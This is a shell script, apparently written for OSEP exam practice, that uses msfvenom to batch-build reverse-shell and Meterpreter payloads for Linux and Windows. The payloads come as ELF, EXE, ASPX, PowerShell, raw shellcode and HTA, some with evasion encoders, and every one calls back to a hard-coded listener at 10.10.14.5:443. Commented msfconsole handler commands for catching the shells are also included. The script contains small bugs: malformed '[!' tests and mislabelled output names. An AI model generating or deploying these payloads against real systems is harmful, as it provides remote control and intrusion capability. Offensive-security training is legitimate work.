#!/bin/sh

# Quicky generate msfvenom bin for OSEP exam
# author: 午後の紅茶
# version: v1.0

static_local_ip_address=10.10.14.5
static_local_port=443

savePath=./generated_bin/

mkdir $savePath
if [! -d "$savePath" ]; then
    mkdir "$savePath"
    echo "Created directory: $savePath"
fi

echo "IP: " $static_local_ip_address
echo "Port: "$static_local_port
echo $savePath

# check path or create it
if [! -d "$savePath/x64" ]; then
    mkdir "$savePath/x64"
    echo "Created directory: $savePath/x64"
else
    echo "Directory already exists: $savePath/x64"
fi

if [! -d "$savePath/x86" ]; then
    mkdir "$savePath/x86"
    echo "Created directory: $savePath/x86"
else
    echo "Directory already exists: $savePath/x86"
fi

## x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port prependfork=true -f elf > "$savePath/x64/linux_x64_meterpreter_rev_tcp.elf"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -e x64/zutto_dekiru -f aspx > "$savePath/x64/win_x64_meterpreter_rev_tcp.aspx"
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f exe -e x64/zutto_dekiru > "$savePath/x64/win_x64_meterpreter_rev_https.exe"
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f elf > "$savePath/x64/linux_x64_shell_rev_tcp.elf"
msfvenom -p linux/x64/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f elf > "$savePath/x64/linux_x64_meterpreter_rev_https.elf"
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f exe > "$savePath/x64/win_x64_shell_rev_tcp.exe"
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x64/win_x64_meterpreter_rev_https.raw"
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x64/win_x64_shell_rev_tcp.raw"
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x64/linux_x64_shell_rev_tcp.raw"
msfvenom -p linux/x64/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x64/linux_x64_meterpreter_rev_https.raw"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x64/win_x64_meterpreter_rev_tcp.ps1"
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x64/win_x64_meterpreter_rev_https.ps1"
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x64/win_x64_shell_rev_tcp.ps1"
msfvenom -p windows/x64/shell/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x64/win_x64_shell_rev_https.ps1"


# sudo msfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 443;run'

## x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port prependfork=true -f elf > "$savePath/x86/linux_x86_meterpreter_rev_tcp.elf"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -e x86/shikata_ga_nai -f aspx > "$savePath/x86/win_x86_meterpreter_rev_tcp.aspx"
msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f exe > "$savePath/x86/win_x86_meterpreter_rev_https.exe"
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f elf > "$savePath/x86/linux_x86_shell_rev_tcp.elf"
msfvenom -p linux/x86/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f elf > "$savePath/x86/linux_x86_meterpreter_rev_https.elf"
msfvenom -p windows/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f exe > "$savePath/x86/win_x86_shell_rev_tcp.exe"
msfvenom -p windows/meterpreter/reverse_http LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x86/win_x86_meterpreter_rev_https.raw"
msfvenom -p windows/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x86/win_x86_shell_rev_tcp.raw"
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x86/linux_x86_shell_rev_tcp.raw"
msfvenom -p linux/x86/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f raw > "$savePath/x86/linux_x86_meterpreter_rev_https.raw"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x86/win_x86_meterpreter_rev_tcp.ps1"
msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x86/win_x86_meterpreter_rev_https.ps1"
msfvenom -p windows/shell/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x86/win_x86_shell_rev_tcp.ps1"
msfvenom -p windows/shell/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f psh > "$savePath/x86/win_x86_shell_rev_https.ps1"


# sudo msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set lhost 0.0.0.0;set lport 443;run'

# generate html doc hta js
msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f hta-psh > $savePath/shell.hta